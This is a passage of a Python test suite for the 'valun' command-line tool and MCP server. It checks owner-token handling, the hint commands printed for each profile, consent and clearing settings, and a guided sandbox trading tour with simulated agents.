    def test_the_token_is_asked_for_at_a_terminal_and_never_stored(self):
        self.join()
        puts = len(self.world.puts)
        with mock.patch.object(sys, 'stdin', Tty('')), mock.patch('getpass.getpass', return_value='vpo_test-only\n') as asked:
            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'console'])
        self.assertEqual(rc, 0, out)
        self.assertEqual(asked.call_args[0][0], 'Owner token (not shown): ')
        self.assertEqual(self.world.puts[puts:], [{'approve_above': 0, 'review_deliveries': True}])
        self.assertEqual(self.disk()['approvals'], 'console')
        self.assertNotIn('vpo_test-only', json.dumps(self.disk()), 'the owner token is never stored')
        with mock.patch.object(sys, 'stdin', Tty('')), mock.patch('getpass.getpass', side_effect=EOFError):
            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'none'])
        self.assertEqual((rc, out.strip()), (1, 'No owner token given; nothing was changed.'))
        with mock.patch.object(sys, 'stdin', io.StringIO('')):
            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'none'])
        self.assertEqual(rc, 1)
        self.assertIn('run again with --owner-token-file FILE (the file holding it; read once, not stored), or in a terminal, '
                      'where it is asked for (not shown).', out)
        self.assertEqual(self.disk()['approvals'], 'console')

    def test_ctrl_c_in_the_tour_ends_with_a_short_message(self):
        self.join()
        with mock.patch.object(sb, 'tour', side_effect=KeyboardInterrupt):
            rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 130)
        self.assertNotIn('Traceback', out)
        self.assertIn(f'The tour stopped (Ctrl+C). Run `valun --profile s sandbox tour --server {SERVER}` again to go on: it '
                      'reads where your tour stands from the server and goes on from that step', out)

    def test_mcp_help_names_the_pinned_uvx_form_only(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            cli.main(['mcp', '--help'])
        text = out.getvalue()
        pin = f'valun=={__version__}'
        self.assertIn(f'claude mcp add valun -- uvx --from {pin} valun mcp', text)
        self.assertIn(f'{{"mcpServers": {{"valun": {{"command": "uvx", "args": ["--from", "{pin}", "valun", "mcp"]}}}}}}', text)
        self.assertIn(f'\n  uvx --from {pin} valun --profile work mcp\n', text)
        for m in re.finditer(r'\bvalun (?:mcp|--profile|join)\b', text):
            self.assertTrue(text[:m.start()].endswith(f'uvx --from {pin} '), text[max(0, m.start() - 40):m.end()])
        self.assertNotIn('"command": "valun"', text)
        self.assertNotIn('["--from", "valun", ', text, 'never an unpinned uvx')


class PrintedCommandsNameTheProfile(Cli):
    """FX3-PY: every command the CLI prints for the owner to run names the profile it is for (`valun --profile NAME
    ...`), so that run in another shell, whatever VALUN_PROFILE says there, it acts on this identity: doctor's FIX lines,
    `valun mcp`'s not-joined hint, the policy, clearing and consent_loop hints (the attempts-list hint: AttemptsCommands)."""

    def commands(self, out):
        return re.findall(r'`valun ([^`]+)`', out)

    def assertNamesProfile(self, out, name='s'):
        cmds = self.commands(out)
        self.assertTrue(cmds, out)
        self.assertEqual([c for c in cmds if not c.startswith(f'--profile {name} ')], [], out)

    def test_doctor_fix_lines(self):
        rc, out = self.run_cli('doctor', '--server', SERVER)                  # not joined
        self.assertEqual(rc, 1, out)
        self.assertIn(f'FIX   Not connected: run `{SANDBOX_JOIN} --server {SERVER}` (no invite: sandbox only), '
                      f'`valun --profile s join --server {SERVER}` (with an invite) or `valun --profile s enroll --server '
                      f'{SERVER}` (with an enrollment code) (with uvx: `uvx --from valun=={__version__} valun ...`).', out)
        self.assertNamesProfile(out)
        self.world.fail['GET /pilot/v1/info'] = [vc.ValunError('unreachable', 'cannot reach it')]
        rc, out = self.run_cli('doctor', '--server', SERVER)
        self.assertIn('Check `valun --profile s config server URL` and your connection.', out)
        self.assertNamesProfile(out)
        self.join()
        disk = self.disk()
        disk['pins'] = {'tracker_nft_id': '11' * 32, 'denomination': 'erg'}   # another network's tracker
        with open(os.path.join(self.home.name, 'profiles', 's.json'), 'w', encoding='utf-8') as f:
            json.dump(disk, f)
        self.world.fail['GET /pilot/v1/me'] = [vc.ValunError('unauthorized', 'revoked', 401)]
        rc, out = self.run_cli('doctor')
        self.assertEqual(rc, 1, out)
        self.assertIn('`valun --profile s config server URL` pins it again.', out)
        self.assertIn('if the owner revoked it, `valun --profile s enroll` again.', out)
        self.assertNamesProfile(out)
        public = self.world.public
        self.world.public = lambda pid: dict(public(pid), status='revoked')
        rc, out = self.run_cli('doctor')
        self.assertIn('The agent key is not active: ask the owner for an enrollment code, then `valun --profile s enroll`.', out)
        self.assertNamesProfile(out)
        # VALUN_PROFILE set but empty selects the default profile, and the commands name it
        rc, out = self.main(['doctor', '--server', SERVER], env={'VALUN_PROFILE': ''})
        self.assertIn(f'`valun --profile default join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME" --server {SERVER}`',
                      out)
        self.assertNamesProfile(out, 'default')

    def test_the_mcp_not_joined_hint(self):
        err = io.StringIO()
        with mock.patch('valun.mcp_server.run', return_value=0) as run, contextlib.redirect_stderr(err):
            rc, _out = self.run_cli('mcp')
        self.assertEqual((rc, run.call_count), (0, 1))
        self.assertIn(f"valun mcp: profile 's' is not joined yet; {JOIN_HINT} first.", err.getvalue())
        self.assertNamesProfile(err.getvalue())
        # and what its tools tell the agent while the profile is not joined names the profile too
        self.assertEqual(run.call_args.kwargs.get('setup_hint'), JOIN_HINT)

    def test_the_not_joined_hint_runs_as_written(self):
        """The 0.7.2 clean-user test: before a join, every tool (`valun call`, `valun mcp`) and valun_status told the
        agent that its owner must run `valun --profile s join`, which asks for an invite code (a sandbox join needs none)
        and has no handle, operator name or owner token file. The hint is now the sandbox join, then its uvx form. Run
        as written in another shell, with only its placeholders filled in, it joins this profile, on the server the
        hint was given for (VALUN_SERVER here, which that shell does not have), with the owner token in join's own
        default file ($HOME/valun-owner-token-HANDLE.txt: the hint names no file, since cmd reads no $HOME)."""
        rc, out = self.main(['--profile', 's', 'call', 'valun_status'], env={'VALUN_SERVER': SERVER})
        r = json.loads(out)
        self.assertEqual((rc, r['error']), (1, 'not_connected'), out)
        self.assertIn(f' in a terminal (with uvx: `uvx --from valun=={__version__} valun ...`)', r['message'])
        cmd = re.search(r'must run `([^`]+)` in a terminal', r['message']).group(1)
        self.assertEqual(cmd, f'{SANDBOX_JOIN} --server {SERVER}', 'a server that is not the default one is named')
        self.assertIn(f'Its owner must run `{cmd}` in a terminal', r['what_this_means'])
        token_file = os.path.join(self.home.name, 'valun-owner-token-stranger.txt')
        # both placeholders filled in: `valun join` refuses either one left as it is (the 0.7.2 review)
        argv = [{'YOUR-HANDLE': 'stranger', 'YOUR NAME': 'A Stranger'}.get(a, a) for a in shlex.split(cmd)]
        self.assertEqual(argv[:4], ['valun', '--profile', 's', 'join'])
        rc, out = self.main(argv[1:])
        self.assertEqual(rc, 0, out)
        self.assertIn('Joined Valun as stranger', out)
        self.assertEqual((self.disk()['participant_id'], self.disk()['server']), (S_ID, SERVER))
        with open(token_file, encoding='utf-8') as f:
            self.assertEqual(f.read(), 'vpo_test-only\n')
        # the default profile's hint, with no server when it is the default one
        rc, out = self.main(['call', 'valun_status'])
        self.assertIn('the owner must run `valun --profile default join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME"` '
                      'in a terminal (with uvx:', json.loads(out)['message'])

    def test_the_policy_clearing_and_consent_loop_hints(self):
        rc, out = self.run_cli('policy', 'show')                              # not joined: the local lines only
        self.assertEqual(rc, 0, out)
        self.assertIn('Local consent policy (this profile; `valun --profile s config consents.<role> on|off`)', out)
        self.assertIn('Consent loop in `valun --profile s mcp` (`valun --profile s config consent_loop on|off`): off', out)
        self.assertNamesProfile(out)
        self.join()
        rc, out = self.run_cli('policy', 'show')
        self.assertEqual(rc, 0, out)
        self.assertNamesProfile(out)
        rc, out = self.run_cli('clearing', 'status')
        self.assertEqual(rc, 0, out)
        self.assertIn('Consent loop in `valun --profile s mcp`: on. `valun --profile s clearing run` signs now.', out)
        self.assertNamesProfile(out)
        rc, out = self.run_cli('config', 'consent_loop', 'off')
        self.assertEqual(rc, 0, out)
        self.assertIn('The consent loop runs inside `valun --profile s mcp` (restart it to start the loop)', out)
        self.assertNamesProfile(out)

    def test_valun_calls_join_and_approval_hints(self):
        rc, out = self.run_cli('call', 'valun_status')                        # not joined
        self.assertEqual(rc, 1, out)
        self.assertEqual(json.loads(out)['message'], f'not enrolled: the owner must {JOIN_HINT}')
        self.assertNamesProfile(out)
        # Approvals ask, a commitment, and no person at this terminal: the advice names this profile; its commands, run
        # as printed in another shell, change this profile (console with this participant's owner token).
        self.join('--approvals', 'ask')
        rc, out = self.run_cli('call', 'valun_propose', json.dumps({'counterparty': X_ID, 'title': 't', 'price': 1}), stdin='')
        self.assertEqual((rc, json.loads(out)['error']), (3, 'approval_unavailable'), out)
        self.assertNamesProfile(out)
        console, none = self.commands(json.loads(out)['message'])
        self.assertEqual((console, none), ('--profile s config approvals console --owner-token-file FILE',
                                           '--profile s config approvals none'))
        rc, done = self.main(shlex.split(none))
        self.assertEqual((rc, self.disk()['approvals']), (0, 'none'), done)
        rc, done = self.main(self.printed(json.loads(out)['message'], 'The owner can run'))
        self.assertEqual((rc, self.disk()['approvals']), (0, 'console'), done)

    def test_the_mcp_servers_approval_unavailable_commands_run_as_written(self):
        """The onboarding review: the three modes the MCP server's approval_unavailable offers an app that cannot ask
        run as printed, each from ask (console with the owner token file of this profile's participant); it says what
        client-prompt relies on, and that this app's Valun server must restart (it reads the mode when it starts)."""
        self.join('--approvals', 'ask')
        from valun import mcp_server
        text = mcp_server.McpServer(None, 'ask', command='valun --profile s').approval_unavailable['what_this_means']
        self.assertIn("then restart this app's Valun server", text)
        self.assertIn('(only if this app confirms each tool call itself, as Claude Code is designed to (not yet tested with '
                      'Valun): an app that runs tools without asking asks nobody)', text)
        cmds = self.commands(text)
        self.assertEqual(cmds, ['--profile s config approvals console --owner-token-file FILE',
                                '--profile s config approvals client-prompt', '--profile s config approvals none'])
        back = ['--profile', 's', 'config', 'approvals', 'ask', '--owner-token-file', self.token_file]
        for cmd, mode in zip(cmds, ('console', 'client-prompt', 'none')):
            rc, out = self.main([self.token_file if a == 'FILE' else a for a in shlex.split(cmd)])
            self.assertEqual((rc, self.disk()['approvals']), (0, mode), out)
            self.assertIn("Restart `valun --profile s mcp` (your MCP app's Valun server) for your MCP app to use it.",
                          out)
            self.assertEqual(cli.CLIENT_PROMPT_CAVEAT in out, mode == 'client-prompt', out)
            rc, out = self.main(back)
            self.assertEqual((rc, self.disk()['approvals']), (0, 'ask'), out)


class Settings(Cli):
    def test_consent_settings_and_policy_show(self):
        self.join(sandbox=False)
        self.assertEqual(self.run_cli('config', 'consents.as_new_creditor', 'on')[0], 0)
        self.assertEqual(self.run_cli('config', 'consents.max_PC', '7')[0], 0)
        self.assertEqual(self.run_cli('config', 'consent_loop', 'on')[0], 0)
        self.assertEqual(self.disk()['consent_policy'], {'setoff': True, 'as_issuer': True, 'as_new_creditor': True, 'max_PC': 7})
        self.assertEqual(self.disk()['consent_loop'], 'on')
        self.assertEqual(self.run_cli('config', 'consents.max_PC', 'none')[0], 0)
        self.assertNotIn('max_PC', self.disk()['consent_policy'])
        for key, value in (('consents.setoff', 'maybe'), ('consents.max_PC', '-1'), ('consent_loop', 'sometimes')):
            rc, _out = self.run_cli('config', key, value)
            self.assertEqual(rc, 1, key)
        rc, out = self.run_cli('policy', 'show')
        self.assertEqual(rc, 0)
        self.assertIn('Local consent policy', out)
        self.assertIn('set-offs (net-neutral): signed by your client (local on, owner auto_clear on)', out)
        self.assertIn('payments to you by transfer: signed by your client', out)
        self.world.mandate['accept_transfers'] = False
        rc, out = self.run_cli('policy', 'show')
        self.assertIn('payments to you by transfer: not signed (local on, owner accept_transfers off)', out)
        rc, out = self.run_cli('status')
        self.assertIn('consents:         setoff on, as_issuer on, as_new_creditor on, no cap (consents.max_PC none); consent loop: on',
                      out)
        self.assertEqual(self.run_cli('config', 'consents.max_PC', '7')[0], 0)
        rc, out = self.run_cli('status')
        self.assertIn('as_new_creditor on, at most 7 PC each (consents.max_PC); consent loop: on', out)

    def test_a_0_3_profile_gets_a_policy_with_every_other_role_off(self):
        path = os.path.join(self.home.name, 'profiles', 's.json')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            json.dump({'server': SERVER, 'participant_id': S_ID}, f)
        self.assertEqual(self.run_cli('config', 'consents.setoff', 'on')[0], 0)
        self.assertEqual(self.disk()['consent_policy'], {'setoff': True, 'as_issuer': False, 'as_new_creditor': False})

    def test_clearing_status_and_run(self):
        # A profile with the stranger's throwaway key (written here), so that the fake can hold edges S signed.
        from test_agent_circulation import NFT, DENOM, S, X
        self.world.keys[S_ID] = S
        self.world.welcome = False
        path = os.path.join(self.home.name, 'profiles', 's.json')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            json.dump({'server': SERVER, 'participant_id': S_ID, 'pubkey': S['pubkey'], 'secret': S['secret'].hex(),
                       'agent_token': 'vpa_test-only', 'approvals': 'none', 'consent_policy': dict(va.SANDBOX_CONSENT_POLICY),
                       'consent_loop': 'off', 'pins': {'tracker_nft_id': NFT, 'denomination': DENOM}}, f)
        rc, out = self.run_cli('clearing', 'run')
        self.assertEqual((rc, out.strip()), (0, 'Nothing waits for your client.'))
        t1, t2 = now_ms() - 120_000 + 1, now_ms() - 110_000 + 2
        self.world.set_edge(X_ID, S_ID, 1, t1)
        self.world.set_edge(S_ID, X_ID, 2, t2, signature=sign_note(S, X['pubkey'], 2, t2))
        self.world.clear()
        rc, out = self.run_cli('clearing', 'status')
        self.assertEqual(rc, 0, out)
        self.assertIn('Your Valun client signs by itself: set-offs', out)
        self.assertIn('Consents waiting for your client: 1', out)
        rc, out = self.run_cli('clearing', 'run')
        self.assertEqual(rc, 0, out)
        self.assertRegex(out.strip(), r'^signed +setoff vs_[0-9a-f]{16} as member, 1 PC \(your net change 0 PC\)$')
        self.assertEqual((self.world.total(X_ID, S_ID), self.world.total(S_ID, X_ID)), (0, 1))
        rc, out = self.run_cli('clearing', 'status')
        self.assertIn('Recent decisions of your client:', out)
        self.assertIn('Cleared by set-off so far: 1 PC', out)


class CallSignsValueSafeConsents(Cli):
    """FX3-PY, decision D-3 a: `valun call` is one tool run with no consent loop behind it, so before valun_status and
    valun_inbox (and no other read-only tool) it signs the value-safe consents, and its result says what it signed."""

    def test_valun_call_status_signs_a_set_off_and_says_so(self):
        from test_agent_circulation import DENOM, NFT, S, X
        w = self.world
        w.keys[S_ID], w.welcome = S, False
        os.makedirs(os.path.join(self.home.name, 'profiles'), exist_ok=True)
        with open(os.path.join(self.home.name, 'profiles', 's.json'), 'w', encoding='utf-8') as f:
            json.dump({'server': SERVER, 'participant_id': S_ID, 'pubkey': S['pubkey'], 'secret': S['secret'].hex(),
                       'agent_token': AGENT_TOKEN, 'approvals': 'none', 'consent_policy': dict(va.SANDBOX_CONSENT_POLICY),
                       'consent_loop': 'off', 'pins': {'tracker_nft_id': NFT, 'denomination': DENOM}}, f)
        w.set_edge(X_ID, S_ID, 1, now_ms() - 120_000 + 1)
        w.set_edge(S_ID, X_ID, 2, now_ms() - 110_000 + 2, signature=sign_note(S, X['pubkey'], 2, now_ms() - 110_000 + 2))
        w.clear()
        (sid,) = [i for i, it in w.items.items() if it['state'] == 'collecting']
        rc, out = self.run_cli('call', 'valun_directory')
        self.assertEqual(rc, 0, out)
        self.assertNotIn('consents_signed_now', json.loads(out))
        self.assertEqual(w.items[sid]['state'], 'collecting')
        rc, out = self.run_cli('call', 'valun_status')
        self.assertEqual(rc, 0, out)
        r = json.loads(out)
        self.assertEqual([(e['id'], e['kind'], e['role']) for e in r['consents_signed_now']], [(sid, 'setoff', 'member')])
        self.assertEqual(w.items[sid]['state'], 'applied')
        self.assertEqual((r['money_view']['you_hold_PC'], r['money_view']['you_owe_PC']), (0, 1))
        self.assertNotIn('consents_last_run_ms', self.disk())        # a read's run: it never delays a full run

    def test_valun_call_inbox_signs_it_too(self):
        # what join tells a shell agent (the readiness assessment of 2026-11-18): `valun call valun_inbox`, run
        # regularly, signs the set-offs the consent loop of `valun mcp` would
        from test_agent_circulation import DENOM, NFT, S, X
        w = self.world
        w.keys[S_ID], w.welcome = S, False
        os.makedirs(os.path.join(self.home.name, 'profiles'), exist_ok=True)
        with open(os.path.join(self.home.name, 'profiles', 's.json'), 'w', encoding='utf-8') as f:
            json.dump({'server': SERVER, 'participant_id': S_ID, 'pubkey': S['pubkey'], 'secret': S['secret'].hex(),
                       'agent_token': AGENT_TOKEN, 'approvals': 'none', 'consent_policy': dict(va.SANDBOX_CONSENT_POLICY),
                       'consent_loop': 'off', 'pins': {'tracker_nft_id': NFT, 'denomination': DENOM}}, f)
        w.set_edge(X_ID, S_ID, 1, now_ms() - 120_000 + 1)
        w.set_edge(S_ID, X_ID, 2, now_ms() - 110_000 + 2, signature=sign_note(S, X['pubkey'], 2, now_ms() - 110_000 + 2))
        w.clear()
        (sid,) = [i for i, it in w.items.items() if it['state'] == 'collecting']
        rc, out = self.run_cli('call', 'valun_inbox')
        self.assertEqual(rc, 0, out)
        self.assertEqual([(e['id'], e['kind'], e['role']) for e in json.loads(out)['consents_signed_now']],
                         [(sid, 'setoff', 'member')])
        self.assertEqual(w.items[sid]['state'], 'applied')


class Tour(Cli):
    def tour_lines(self, out):
        """{step: {edge: total}} from the tour's 'step N done' lines."""
        found = {}
        for line in out.splitlines():
            if line.startswith('step ') and ' done. Your edges on the tracker: ' in line:
                step = int(line.split()[1])
                found[step] = {k: int(v.split()[0]) for k, v in (x.split(': ') for x in line.split(': ', 1)[1].split('; '))}
        return found

    def test_the_tour_takes_a_fresh_sandbox_joiner_through_the_five_steps(self):
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.tour_lines(out), TOUR_TOTALS)
        self.assertIn('The tour is complete', out)
        w = self.world
        self.assertEqual((w.total(X_ID, M_ID), w.total(M_ID, X_ID)), (0, 1))     # the server-only cycle cleared too
        self.assertEqual([d['status'] for d in w.deals.values()],
                         ['note_issued', 'disputed', 'paid_by_transfer', 'note_issued', 'note_issued', 'paid_by_transfer'])
        setoffs = [j for j in w.journal if j['kind'] == 'setoff' and j['ref'] != 'vs_server']
        self.assertEqual(len({j['ref'] for j in setoffs}), 2)                     # the 2-cycle and the 3-cycle, signed by S
        self.assertIn('Valun - PAY sandbox-mallory 2 PC', out)                    # the commitments it signed are shown
        self.assertIn('Valun - PAY sandbox-exact 2 PC', out)
        disk = self.disk()
        self.assertEqual(sorted(disk['records']['paid_deals']), sorted(did for did, d in w.deals.items() if d['payer'] == S_ID
                                                                         and d['status'] in ('note_issued', 'paid_by_transfer')))
        self.assertEqual(sum(1 for e in disk['consent_log'] if e['decision'] == 'signed' and e['kind'] == 'setoff'), 2)
        # The done text is what happened, from the position; on the tour's path it is the design's 9.2 text.
        self.assertIn('\n' + TOUR_DONE + '\n', out)
        # The tour is done: running it again changes nothing.
        posts = len(w.posts)
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual((rc, len(w.posts)), (0, posts))
        self.assertIn('The tour is complete', out)

    def test_the_tour_reads_no_ledger_waits_what_each_step_asks_and_goes_on_after_a_cut_read(self):
        """0.7.2 review: step 4 read the whole public ledger (about 270 KB) on every valun_status, every 3 s while the tour
        waited, and a cut connection there ended the tour with a traceback. Now no ledger is read, the tour waits what
        sandbox_next_steps asks (retry_after_seconds, at most TOUR_WAIT_MAX_S) while nothing is to be called, and a
        step's totals that cannot be read are said so and the tour goes on."""
        self.join()
        waits, nap = [], sb.time.sleep
        real_totals, cut = sb.edge_totals, [True]

        def totals(c):
            if cut[0]:
                cut[0] = False
                raise vc.ValunError('unreachable', 'the connection was cut', None, {'cause': 'connection_cut'})
            return real_totals(c)
        with mock.patch.object(sb.time, 'sleep', lambda s: (waits.append(s), nap(s))), \
                mock.patch.object(sb, 'edge_totals', totals):
            rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertIn('step 1 done. (Your edges on the tracker could not be read just now: unreachable.)', out)
        self.assertEqual({k: v for k, v in self.tour_lines(out).items() if k != 1}, {k: v for k, v in TOUR_TOTALS.items() if k != 1})
        self.assertNotIn(('GET', '/pilot/v1/ledger', None), self.world.log)
        self.assertTrue(waits and all(sb.TOUR_POLL_S <= s <= sb.TOUR_WAIT_MAX_S for s in waits), waits)
        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': 30}, 3), sb.TOUR_WAIT_MAX_S)
        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': va.SETOFF_DUE_RETRY_S}, 3), 15)
        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': 5}, 3), 5)
        self.assertEqual(sb.tour_wait_s({}, 3), 3)
        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': True}, 3), 3)

    def test_a_finished_tour_stays_finished_after_an_earn(self):
        """The 0.7.2 clean-user test (two profiles): after the tour, `valun sandbox earn` left a note of sandbox-exact
        held, and sandbox_next_steps, which reads the step from what is held and owed with the sandbox agents, said step
        3 again; `valun sandbox tour` started over at "step 3 of 5". The profile now keeps the tour's end
        (sandbox_tour_done), so the next steps stay done and the tour again changes nothing."""
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        rc, out = self.run_cli('sandbox', 'earn')
        self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['paid']), (0, True), out)
        self.assertEqual(self.world.total(X_ID, S_ID), 3, 'a note of sandbox-exact is held again')
        for brief in (False, True):
            rc, out = self.run_cli('call', 'valun_status', json.dumps({'brief': brief}))
            n = json.loads(out)['sandbox_next_steps']
            self.assertEqual((n['tour_step'], n['next_calls']), ('done', []), (brief, n))
            self.assertNotIn('retry_after_seconds', n, 'done: nothing to wait for')
            self.assertEqual(n['then'], va.TOUR_COMPLETED)
        self.assertEqual(self.disk().get('sandbox_tour_done'), S_ID, 'the end is kept in the profile')
        posts = len(self.world.posts)
        rc, out = self.run_cli('sandbox', 'tour', tty=True, answers=[])      # nothing is asked
        self.assertNotIn('step 3 of 5', out)
        self.assertEqual((rc, len(self.world.posts)), (0, posts), out)
        self.assertEqual(out.strip(), va.TOUR_COMPLETED)
        self.assertEqual(va.TOUR_DONE_KEY, 'sandbox_tour_done')

    def test_a_sandbox_agent_that_pays_on_a_slower_tick_is_waited_for(self):
        # The live server: a sandbox agent's note reaches the tracker a tick after it paid, so a status can read the
        # position before the note and the inbox after it. Before 0.4.1 the tour then sold sandbox-exact a second job in
        # step 1 (and sandbox-mallory a second one in step 4), held 6 PC, never formed a cycle, and said it was done.
        self.world.slow_pay = True
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.tour_lines(out), TOUR_TOTALS)
        self.assertIn('A deal of yours with a sandbox agent is being paid', out)
        self.assertEqual([d['status'] for d in self.world.deals.values()],
                         ['note_issued', 'disputed', 'paid_by_transfer', 'note_issued', 'note_issued', 'paid_by_transfer'])
        self.assertIn('\n' + TOUR_DONE + '\n', out)

    def test_six_pc_earned_in_step_1_still_reach_a_set_off_and_the_done_text_says_what_happened(self):
        # Two jobs from sandbox-exact in step 1 (what the race above left on the live server): step 2 pays once by
        # transfer, then step 3 pays sandbox-exact with S's own note (not step 2 again), until set-offs cleared the rest.
        self.world.welcome_jobs = 2
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.tour_lines(out), {1: {'sandbox-exact -> you': 6}, 2: {'sandbox-exact -> you': 4},
                                                3: {'sandbox-exact -> you': 0, 'you -> sandbox-exact': 0}})
        w = self.world
        setoffs = {j['ref'] for j in w.journal if j['kind'] == 'setoff' and j['ref'] != 'vs_server'}
        self.assertEqual(len(setoffs), 2)                                         # two 2-cycles, 2 PC each, signed by S
        self.assertEqual(w.position()['cleared_by_setoff'], 4)
        self.assertIn('\nThe tour is complete: you earned 6 PC and spent 6 PC (2 by transfer, 4 with your own note), and '
                      'set-offs cancelled 4 PC of your claims and 4 PC of your debts without changing your net position. You '
                      'can keep trading with the sandbox agents.\n', out)

    def test_the_tour_asks_at_the_terminal_and_stops_when_declined(self):
        self.join()
        rc, out = self.run_cli('sandbox', 'tour')                                 # no person at this terminal
        self.assertEqual(rc, 3)
        self.assertIn('--yes', out)
        rc, out = self.run_cli('sandbox', 'tour', tty=True, answers=['n'])
        self.assertEqual(rc, 1)
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['error'], 'owner_declined')
        self.assertEqual(self.world.deals[self.world.order[0]]['status'], 'open')  # the welcome job was not accepted
        asked = []

        def yes(prompt):
            asked.append(prompt)
            return 'y'
        with mock.patch('builtins.input', side_effect=yes):
            rc, out = self.run_cli('sandbox', 'tour', tty=True)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.tour_lines(out), TOUR_TOTALS)
        # Asked for: the welcome acceptance; two purchases and the payment of step 2 (one wrong delivery disputed); the
        # purchase and payment of step 3; the sale of step 4; the purchase and payment of step 5.
        self.assertEqual(len(asked), 9)
        self.assertIn("Valun - ACCEPT sandbox-exact's offer", out)

    def test_wrong_deliveries_in_a_row_are_disputed_and_bought_again(self):
        # sandbox-mallory is wrong on purpose for about half of all deal ids (design 5.8): against the real server, 6 or
        # more wrong deliveries in a row happen in 1 tour of 64 (INT-1). Each is disputed and the job bought again
        # (design 9.2); neither counts toward the stuck limit, so the tour still ends with the totals of design 9.2.
        self.world.wrong_left = 7
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.tour_lines(out), TOUR_TOTALS)
        self.assertEqual([d['status'] for d in self.world.deals.values()].count('disputed'), 7)

    def test_the_tour_stops_after_too_many_wrong_deliveries_in_one_step(self):
        self.world.wrong_left = sb.TOUR_DISPUTES_PER_STEP + 5
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['error']), (1, 'tour_stuck'))
        self.assertEqual([d['status'] for d in self.world.deals.values()].count('disputed'), sb.TOUR_DISPUTES_PER_STEP)

    def test_a_3_cycle_that_cannot_form_stops_the_tour_early_and_a_later_run_finishes_it(self):
        # The onboarding review's stall (testnet, 2026-11-16): earlier tours' step 5 had left sandbox-mallory owing
        # sandbox-exact 2 PC, the server set this tour's step-2 debt of sandbox-exact to sandbox-mallory off against
        # it at once, and step 4's 3-cycle could never be proposed: the tour waited for it until its 30-minute deadline.
        self.join()
        w = self.world
        w.set_edge(M_ID, X_ID, 2, now_ms() - 3_600_000)
        start = sb.time.time()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        err = json.loads(out.strip().splitlines()[-1])
        self.assertEqual((rc, err['error']), (1, 'tour_blocked'), out)
        self.assertLess(sb.time.time() - start, 600, 'it stops minutes after the wait is known to be blocked')
        self.assertIn('step 4 cannot finish now (cycle_leg_missing): The 3-cycle sandbox-mallory -> you -> '
                      'sandbox-exact -> sandbox-mallory cannot clear now', err['message'])
        self.assertIn('Nothing is lost', err['what_this_means'])
        self.assertIn('  (waiting up to 2 minutes for that to change)', out)
        self.assertEqual(out.count('cannot clear now'), 2, out)        # said once while it waited, then in the error
        totals = (w.total(X_ID, M_ID), w.total(M_ID, X_ID), w.total(M_ID, S_ID), w.total(S_ID, X_ID))
        self.assertEqual(totals, (0, 0, 3, 1))
        # Another participant's step 2 gives sandbox-exact a debt to sandbox-mallory again: run again, the tour goes on
        # from step 4 and finishes.
        w.set_edge(X_ID, M_ID, 2, now_ms() - 1_000, 'transfer_in', 'vt_other')
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out)
        self.assertIn('The tour is complete', out)
        self.assertEqual((w.total(M_ID, S_ID), w.total(S_ID, X_ID)), (0, 0))

    def test_the_tour_is_only_for_sandbox_participants_on_a_circulating_server(self):
        self.join(sandbox=False)
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['error']), (1, 'not_sandbox_only'))


class TourWithoutCirculation(Cli):
    features = None

    def test_feature_unavailable(self):
        self.join()
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['error']), (1, 'feature_unavailable'))

    def test_the_seller_asks_nothing_more_once_the_server_shows_no_circulation(self):   # decision D-2 h
        self.join()
        seller = sb.Seller(vc.FileStore(os.path.join(self.home.name, 'profiles', 's.json')), server=SERVER, log=io.StringIO())
        seller.step()
        later = vc.time.time() + 2 * va.CONSENTS_EVERY_MS / 1000
        with mock.patch.object(vc, 'time', types.SimpleNamespace(time=lambda: later)):
            seller.step()                                        # a minute later: due again, but known to be off
        self.assertEqual(self.world.requests().count('GET /pilot/v1/info'), 2)    # the join's read and the first step's
        self.assertNotIn('GET /pilot/v1/consents', self.world.requests())


class TourDeclaresItsRoles(Cli):
    """FX3-PY attempt 2: `valun sandbox tour` turns its agent's consent hook off only because it signs the consents itself,
    on that agent's client, so its clients declare the roles the profile signs (ValunAgent declare_roles). Here every
    request goes through the real Client.request and urllib (wired: the X-Valun-Features header reaches the fake server),
    and the server, as v16, proposes a set-off through S only while S declared the setoff role: a tour whose clients
    declared no role, or withdrew the roles `valun call` declared (consents/1;roles=), never got past step 3."""
    FULL = 'consents/1;roles=setoff,issuer,creditor'      # a sandbox join signs all three roles

    def setUp(self):
        super().setUp()
        self.heads = []
        self.world.s_roles = set()                        # the server took no role from S yet
        for p in wired(self.world, self.heads):
            p.start()
